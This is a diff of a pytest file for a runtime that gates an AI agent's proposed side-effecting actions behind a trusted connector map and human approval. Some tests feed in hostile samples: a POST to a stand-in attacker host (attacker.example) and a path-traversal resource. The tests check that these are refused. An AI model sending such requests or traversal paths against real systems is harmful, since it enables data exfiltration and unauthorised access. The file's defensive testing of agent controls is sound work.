@@ -64,7 +64,7 @@ from tests.test_event_outbox import _database
 from tests.workflow_helpers import make_manifest
 
 RUN = "RUN-ep"
-SECRET = "secret-args-marker-91d2"  # gitleaks:allow
+PLANTED = "planted-argument-value"
 CONNECTOR = "document-request"
 RESOURCE = "cases/MORT-2026-000184/document-requests"
 PROTECTED = "request_missing_document"
@@ -187,6 +187,8 @@ def _context(factory: Callable[[], Session], **changes: Any) -> GovernedStepCont
         "limits": lambda agent: LIMITS,
         "requested_by": "editor-1",
         "approval_ttl_seconds": 3600,
+        # the producer's trusted map of which backend each tool sends through (never anything the model said)
+        "tool_backends": {PROTECTED: "document_request"},
     }
     fields.update(changes)
     return GovernedStepContext(**fields)
@@ -494,25 +496,157 @@ def test_the_models_claims_never_decide_the_class(world: Any) -> None:
 def test_the_connector_version_is_the_dispatchers_not_the_models(world: Any) -> None:
     context = _context(world)
     request = _request()
-    wrong = _action(connector_version="9.9.9-" + SECRET)
+    wrong = _action(connector_version="9.9.9-" + PLANTED)
     with pytest.raises(EffectRefused) as refused:
         record_step_proposal(context, request, _result(request, wrong), _tools())
     assert refused.value.code == "claim_mismatch"
-    assert SECRET not in str(refused.value) and SECRET not in repr(refused.value)
+    assert PLANTED not in str(refused.value) and PLANTED not in repr(refused.value)
     assert _rows(world) == ([], [])
 
 
-def test_a_connector_the_dispatcher_cannot_perform_is_refused_before_anyone_is_asked(
+def test_a_connector_no_tool_of_the_agent_maps_to_is_refused_before_anyone_is_asked(
     world: Any,
 ) -> None:
     context = _context(world)
     request = _request()
-    stranger = _action(connector="payroll-" + SECRET)
-    with pytest.raises(UnsupportedEffectPath) as refused:
+    stranger = _action(connector="payroll-" + PLANTED)
+    with pytest.raises(EffectRefused) as refused:
         record_step_proposal(context, request, _result(request, stranger), _tools())
-    assert refused.value.code == "unsupported_effect_path"
-    assert SECRET not in str(refused.value)
+    assert refused.value.code == "connector_not_mapped"
+    assert PLANTED not in str(refused.value)
     assert _rows(world) == ([], [])
+
+
+def test_a_hostile_connector_and_destination_are_refused_and_nothing_is_written(
+    world: Any,
+) -> None:
+    """The reviewer's probe: the model names the registered ``http`` connector and an attacker's address.
+
+    The agent's tool maps to ``document_request``, so ``http`` is not a connector this agent can reach, whatever class the
+    model claims for it; nothing is recorded and nobody is asked.
+    """
+    request = _request()
+    hostile = _action(
+        connector="http",
+        connector_version="1",
+        effect_class="reversible_write",
+        resource="https://attacker.example/x-" + PLANTED,
+        args={"url": "https://attacker.example/x", "method": "POST"},
+    )
+    with pytest.raises(EffectRefused) as refused:
+        record_step_proposal(_context(world), request, _result(request, hostile), _tools())
+    assert refused.value.code == "connector_not_mapped"
+    assert PLANTED not in str(refused.value) and PLANTED not in repr(refused.value)
+    assert _rows(world) == ([], [])
+    # and the same through the runtime: the run ends in a bounded error with no proposal and no request
+    result, _, canaries = _run(world, [_proposing(hostile)])
+    assert result.status == "error"
+    assert (
+        result.error
+        == "ToolExecutionError: governed agent step proposal refused: connector_not_mapped"
+    )
+    assert canaries.mutations == [] and _rows(world) == ([], [])
+
+
+@pytest.mark.parametrize(
+    "resource",
+    [
+        "cases/../admin/document-requests",
+        "other/CASE-1/document-requests",
+        "cases/CASE-1/other",
+        "http://attacker.example/x",
+    ],
+)
+def test_a_destination_the_admitted_connector_does_not_accept_is_refused(
+    world: Any, resource: str
+) -> None:
+    request = _request()
+    with pytest.raises(EffectRefused) as refused:
+        record_step_proposal(
+            _context(world), request, _result(request, _action(resource=resource)), _tools()
+        )
+    assert refused.value.code == "resource_not_admitted"
+    assert _rows(world) == ([], [])
+
+
+def test_the_backend_kind_comes_from_the_trusted_map_not_from_the_proposal(world: Any) -> None:
+    """A tool mapped to a kind that is not registered, or no tool mapped at all, is never a route to a connector."""
+    request = _request()
+    for mapping in (
+        {},
+        {PROTECTED: "no_such_backend"},
+        {"not_a_tool_of_this_agent": "document_request"},
+    ):
+        with pytest.raises(EffectRefused) as refused:
+            record_step_proposal(
+                _context(world, tool_backends=mapping), request, _result(request), _tools()
+            )
+        assert refused.value.code == "connector_not_mapped"
+    assert _rows(world) == ([], [])
+
+
+def test_a_read_tool_is_never_a_route_to_a_connector(world: Any) -> None:
+    request = _request()
+    tools = {
+        PROTECTED: ToolTrust(PROTECTED, "read", True, "dispatch"),
+        "other": untrusted_tool("other"),
+    }
+    with pytest.raises(EffectRefused) as refused:
+        record_step_proposal(_context(world), request, _result(request), tools)
+    assert refused.value.code == "connector_not_mapped"
+
+
+def test_two_backends_for_one_connector_are_ambiguous_and_refused(
+    world: Any, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    import caliber.effects.dispatcher as dispatcher_module
+
+    twin = dispatcher_module.BACKENDS["document_request"]
+    monkeypatch.setitem(dispatcher_module.BACKENDS, "document_request_twin", twin)
+    request = _request()
+    context = _context(
+        world, tool_backends={PROTECTED: "document_request", "other": "document_request_twin"}
+    )
+    tools = {**_tools(), "other": untrusted_tool("other")}
+    with pytest.raises(EffectRefused) as refused:
+        record_step_proposal(context, request, _result(request), tools)
+    assert refused.value.code == "connector_ambiguous"
+    assert _rows(world) == ([], [])
+
+
+def test_a_backend_that_is_not_admitted_is_refused_with_its_code_and_nothing_is_written(
+    world: Any, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    import caliber.effects.dispatcher as dispatcher_module
+
+    drifted = replace(dispatcher_module.BACKENDS["document_request"], configuration={"drifted": 1})
+    monkeypatch.setitem(dispatcher_module.BACKENDS, "document_request", drifted)
+    request = _request()
+    with pytest.raises(UnsupportedEffectPath) as refused:
+        record_step_proposal(_context(world), request, _result(request), _tools())
+    assert refused.value.code == "connector_configuration_mismatch"
+    assert _rows(world) == ([], [])
+
+
+def test_the_admission_is_the_trusted_kinds_and_is_what_submit_proposal_receives(
+    world: Any, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    seen: list[Any] = []
+    real = step_proposal.submit_proposal
+
+    def spy(*args: Any, **kwargs: Any) -> Any:
+        seen.append(kwargs["admission"])
+        return real(*args, **kwargs)
+
+    monkeypatch.setattr(step_proposal, "submit_proposal", spy)
+    request = _request()
+    record_step_proposal(_context(world), request, _result(request), _tools())
+    (admission,) = seen
+    assert (admission.backend_kind, admission.connector, admission.connector_version) == (
+        "document_request",
+        "document-request",
+        "1",
+    )
 
 
 def test_a_refused_tool_path_is_never_proposed(world: Any) -> None:
@@ -524,23 +658,29 @@ def test_a_refused_tool_path_is_never_proposed(world: Any) -> None:
     assert _rows(world) == ([], [])
 
 
-def test_the_class_is_the_strictest_of_the_agents_tools_whatever_the_model_says(
-    world: Any,
-) -> None:
-    """The v1 proposal names no tool, so a lesser claim cannot ride on a lesser tool of an agent that holds a stricter one."""
-    context = _context(world)
+def test_the_class_is_the_strictest_of_the_tools_that_map_to_the_connector(world: Any) -> None:
+    """A v1 proposal names no tool, so the tools that send through the named connector are all it could be: the strictest wins."""
     request = _request()
-    tools = _tools(write_workdir_file="reversible_write")  # plus the fail-closed custom tool
-    with pytest.raises(EffectRefused) as refused:
-        record_step_proposal(
-            context, request, _result(request, _action(effect_class="reversible_write")), tools
-        )
-    assert refused.value.code == "claim_mismatch"
-    only_lesser = {
+    lesser = {
         "write_workdir_file": ToolTrust("write_workdir_file", "reversible_write", True, "dispatch")
     }
+    mapped_both = _context(
+        world,
+        tool_backends={PROTECTED: "document_request", "write_workdir_file": "document_request"},
+    )
+    tools = {**_tools(), **lesser}
+    with pytest.raises(EffectRefused) as refused:
+        record_step_proposal(
+            mapped_both, request, _result(request, _action(effect_class="reversible_write")), tools
+        )
+    assert refused.value.code == "claim_mismatch"
+    # a stricter tool that does not send through this connector does not raise the class
+    only_lesser_mapped = _context(world, tool_backends={"write_workdir_file": "document_request"})
     recorded = record_step_proposal(
-        context, request, _result(request, _action(effect_class="reversible_write")), only_lesser
+        only_lesser_mapped,
+        request,
+        _result(request, _action(effect_class="reversible_write")),
+        tools,
     )
     proposals, _ = _rows(world)
     assert proposals[0].effect_class == "reversible_write"
@@ -639,11 +779,11 @@ def test_a_refusal_never_carries_the_actions_arguments(world: Any, caplog: Any) 
     caplog.set_level(logging.DEBUG)
     context = _context(world)
     request = _request()
-    bad = _action(args={"document_type": SECRET}, effect_class="read")
+    bad = _action(args={"document_type": PLANTED}, effect_class="read")
     with pytest.raises(EffectRefused) as refused:
         record_step_proposal(context, request, _result(request, bad), _tools())
-    assert SECRET not in str(refused.value) and SECRET not in repr(refused.value)
-    assert SECRET not in caplog.text
+    assert PLANTED not in str(refused.value) and PLANTED not in repr(refused.value)
+    assert PLANTED not in caplog.text
 
 
 def test_a_proposal_that_has_moved_on_is_not_asked_about_again(world: Any) -> None:
@@ -771,7 +911,7 @@ def test_an_error_code_that_is_not_a_fixed_token_never_reaches_the_run_error() -
     request = _request()
     for code, shown in (
         ("model_refused", " (model_refused)"),
-        ("Not A Token " + SECRET, ""),
+        ("Not A Token " + PLANTED, ""),
         (None, ""),
     ):
         unvalidated = AgentStepResult(
@@ -786,7 +926,7 @@ def test_an_error_code_that_is_not_a_fixed_token_never_reaches_the_run_error() -
         )
         error = runtime_module._governed_stop_error(unvalidated)
         assert str(error) == f"governed agent step stopped: error{shown}"
-        assert SECRET not in str(error)
+        assert PLANTED not in str(error)
 
 
 @pytest.mark.parametrize(
@@ -948,7 +1088,7 @@ def test_the_adapter_is_handed_only_the_tools_the_platform_calls_read(world: Any
     assert canaries.mutations == []
 
 
-def test_a_handoff_target_is_handed_only_its_own_read_tools(world: Any) -> None:
+def test_an_agent_with_a_handoff_is_refused_before_anything_runs(world: Any) -> None:
     manifest = _manifest()
     manifest["nodes"]["agent"]["handoffs"] = [{"target": "billing"}]
     manifest["nodes"]["billing"] = {
@@ -961,40 +1101,128 @@ def test_a_handoff_target_is_handed_only_its_own_read_tools(world: Any) -> None:
         "inputs": {"input": {"type": "string"}},
         "outputs": {"final_output": {"type": "string"}},
     }
-    seen: list[AgentStepInput] = []
-
-    class Spy(FakeWorkflowExecutor):
-        def run_step(self, request: AgentStepRequest, step_input: AgentStepInput) -> Any:
-            seen.append(step_input)
-            return super().run_step(request, step_input)
-
-    canaries = Canaries()
-    result = execute(
-        _plan(world, manifest=manifest),
-        "go",
-        executor=Spy(step_script=[ScriptedStep("completed", usage=USAGE)]),
-        extra_tools=canaries.tools(),
+    result, executor, canaries = _run(world, [_proposing()], plan=_plan(world, manifest=manifest))
+    assert result.status == "error"
+    assert result.error == (
+        "ToolExecutionError: governed agent steps do not follow handoffs: agent 'agent' has some"
     )
-    assert result.status == "completed"
-    (step_input,) = seen
-    assert step_input.handoff_agents is not None
-    assert "billing" in step_input.handoff_agents
-    for target in step_input.handoff_agents.values():
-        assert set(target.read_tools) == {READ}, (
-            "a target is given its read tools, never a protected one"
-        )
-    assert canaries.mutations == []
+    assert executor.step_requests == [] and result.steps == []
+    assert canaries.mutations == [] and _rows(world) == ([], [])
 
 
-def test_an_agent_without_declared_outputs_publishes_its_final_output(world: Any) -> None:
+def _inline_manifest(kind: str) -> dict[str, Any]:
+    """A graph whose agent (with the read and the protected tool) is the inline target of a fan-out, a loop or a boundary."""
     manifest = _manifest()
-    del manifest["nodes"]["final"]
-    manifest["edges"] = [manifest["edges"][0]]
-    manifest["nodes"]["agent"]["outputs"] = {}
-    result, _, _ = _run(
-        world, [ScriptedStep("completed", usage=USAGE)], plan=_plan(world, manifest=manifest)
+    nodes: dict[str, Any] = {
+        "start": manifest["nodes"]["start"],
+        "agent": manifest["nodes"]["agent"],
+        "final": manifest["nodes"]["final"],
+    }
+    if kind == "for_each":
+        nodes["parent"] = {
+            "id": "parent",
+            "type": "for_each",
+            "target_node_id": "agent",
+            "inputs": {"items": {"type": "structured"}},
+            "outputs": {"results": {"type": "structured"}, "text": {"type": "string"}},
+        }
+        nodes["start"] = {
+            "id": "start",
+            "type": "start",
+            "outputs": {"items": {"type": "structured"}},
+        }
+        first = {"id": "e1", "from": "start", "to": "parent", "map": {"items": "items"}}
+        out = "text"
+    elif kind == "loop":
+        nodes["parent"] = {
+            "id": "parent",
+            "type": "loop",
+            "target_node_id": "agent",
+            "max_iterations": 2,
+            "stop_condition": "state.done",
+            "inputs": {"input": {"type": "string"}, "state": {"type": "structured"}},
+            "outputs": {"output": {"type": "string"}, "result": {"type": "structured"}},
+        }
+        first = {"id": "e1", "from": "start", "to": "parent", "map": {"msg": "input"}}
+        out = "output"
+    else:
+        nodes["compensate"] = {
+            "id": "compensate",
+            "type": "python_code",
+            "code": 'return {"text": "recovered", "result": {}}',
+            "inputs": {"input": {"type": "string"}},
+            "outputs": {"text": {"type": "string"}, "result": {"type": "structured"}},
+        }
+        nodes["parent"] = {
+            "id": "parent",
+            "type": "error_boundary",
+            "target_node_id": "agent",
+            "compensate_with": "compensate",
+            "fallback_text": "fallback",
+            "inputs": {"input": {"type": "string"}},
+            "outputs": {"output": {"type": "string"}, "error": {"type": "structured"}},
+        }
+        first = {"id": "e1", "from": "start", "to": "parent", "map": {"msg": "input"}}
+        out = "output"
+    manifest["nodes"] = nodes
+    manifest["edges"] = [
+        first,
+        {"id": "e2", "from": "parent", "to": "final", "map": {out: "response"}},
+    ]
+    return manifest
+
+
+@pytest.mark.parametrize("kind", ["for_each", "loop", "error_boundary"])
+def test_a_governed_agent_is_refused_as_an_inline_target_and_leaves_no_rows(
+    world: Any, kind: str
+) -> None:
+    """An inline target cannot carry a park: without the refusal the run would finish with an unapproved proposal behind it."""
+    plan = _plan(world, manifest=_inline_manifest(kind))
+    executor = FakeWorkflowExecutor(step_script=[_proposing(), _proposing()])
+    canaries = Canaries()
+    result = execute(plan, '["a", "b"]', executor=executor, extra_tools=canaries.tools())
+    assert result.status == "error"
+    assert result.error is not None and result.error.startswith(
+        "ToolExecutionError: governed agent steps cannot run inline: agent 'agent' is a target of "
     )
-    assert result.status == "completed"
+    assert f"{kind} node 'parent'" in result.error
+    assert executor.step_requests == [] and result.steps == []
+    assert canaries.mutations == []
+    assert _rows(world) == ([], []), "no proposal and no approval request is left behind"
+
+
+@pytest.mark.parametrize("kind", ["for_each", "error_boundary"])
+def test_the_same_graph_without_a_governed_context_still_runs_its_inline_agent(
+    world: Any, kind: str
+) -> None:
+    plan = _plan(world, governed=False, manifest=_inline_manifest(kind))
+    result = execute(plan, '["a"]', executor=FakeWorkflowExecutor(), extra_tools=Canaries().tools())
+    assert result.status == "completed", result.error
+
+
+def test_a_step_that_completes_without_proposing_is_refused_not_published_empty(world: Any) -> None:
+    result, executor, canaries = _run(
+        world,
+        [
+            ScriptedStep(
+                "completed",
+                usage=StepUsage(7, 3, 10, 1, 1),
+                read_tool_calls=((READ, {"path": "a"}),),
+            )
+        ],
+    )
+    assert result.status == "error"
+    assert result.error == (
+        "ToolExecutionError: governed agent step completed without an output channel: "
+        "the v1 step result carries no text"
+    )
+    assert result.output == "" and not any(
+        step.status == "ok" and step.node_id == "agent" for step in result.steps
+    )
+    assert canaries.reads == [{"path": "a"}] and canaries.mutations == []
+    assert _rows(world) == ([], [])
+    assert len(executor.step_requests) == 1
+    assert executor.calls == [], "the legacy run_agent path is not used by a governed step"
 
 
 def test_a_tool_the_platform_cannot_place_is_not_handed_to_the_adapter_as_read(
@@ -1037,32 +1265,19 @@ def test_a_lying_class_is_refused_and_nothing_is_recorded(world: Any) -> None:
 
 
 def test_a_refusal_in_the_run_error_is_payload_free(world: Any) -> None:
-    secret_action = _action(connector="payroll", args={"document_type": SECRET})
+    secret_action = _action(connector="payroll", args={"document_type": PLANTED})
     result, _, _ = _run(world, [_proposing(secret_action)])
     assert result.status == "error"
-    assert SECRET not in (result.error or "")
-    assert "unsupported_effect_path" in (result.error or "")
+    assert PLANTED not in (result.error or "")
+    assert "connector_not_mapped" in (result.error or "")
 
 
-def test_a_step_that_completes_publishes_an_empty_output_and_its_usage(world: Any) -> None:
-    result, executor, canaries = _run(
-        world,
-        [
-            ScriptedStep(
-                "completed",
-                usage=StepUsage(7, 3, 10, 1, 1),
-                read_tool_calls=((READ, {"path": "a"}),),
-            )
-        ],
+def test_a_completed_step_does_not_run_the_downstream_nodes(world: Any) -> None:
+    result, _, _ = _run(world, [ScriptedStep("completed", usage=USAGE)])
+    assert result.status == "error"
+    assert [step.node_id for step in result.steps] == ["start"], (
+        "the agent and everything after it did not run"
     )
-    assert result.status == "completed" and result.output == ""
-    (step,) = [s for s in result.steps if s.node_id == "agent"]
-    assert (step.tokens, step.prompt_tokens, step.completion_tokens) == (10, 7, 3)
-    assert step.status == "ok" and step.output == ""
-    assert canaries.reads == [{"path": "a"}] and canaries.mutations == []
-    assert _rows(world) == ([], [])
-    assert len(executor.step_requests) == 1
-    assert executor.calls == [], "the legacy run_agent path is not used by a governed step"
 
 
 @pytest.mark.parametrize(
@@ -1074,8 +1289,8 @@ def test_a_step_that_completes_publishes_an_empty_output_and_its_usage(world: An
             ScriptedStep("refused", usage_source="unknown", error_code="model_refused"),
             "stopped: refused (model_refused)",
         ),
-        (TimeoutError("boom-" + SECRET), "stopped: error (adapter_timeout)"),
-        (RuntimeError("boom-" + SECRET), "stopped: error (provider_error)"),
+        (TimeoutError("boom-" + PLANTED), "stopped: error (adapter_timeout)"),
+        (RuntimeError("boom-" + PLANTED), "stopped: error (provider_error)"),
     ],
     ids=["max_turns", "max_tokens", "refused", "timeout", "provider_error"],
 )
@@ -1085,7 +1300,7 @@ def test_a_step_that_stops_without_a_proposal_is_a_bounded_run_error(
     result, _, canaries = _run(world, [entry])
     assert result.status == "error"
     assert result.error == f"ToolExecutionError: governed agent step {expected}"
-    assert SECRET not in (result.error or "")
+    assert PLANTED not in (result.error or "")
     assert canaries.mutations == [] and _rows(world) == ([], [])
 
 
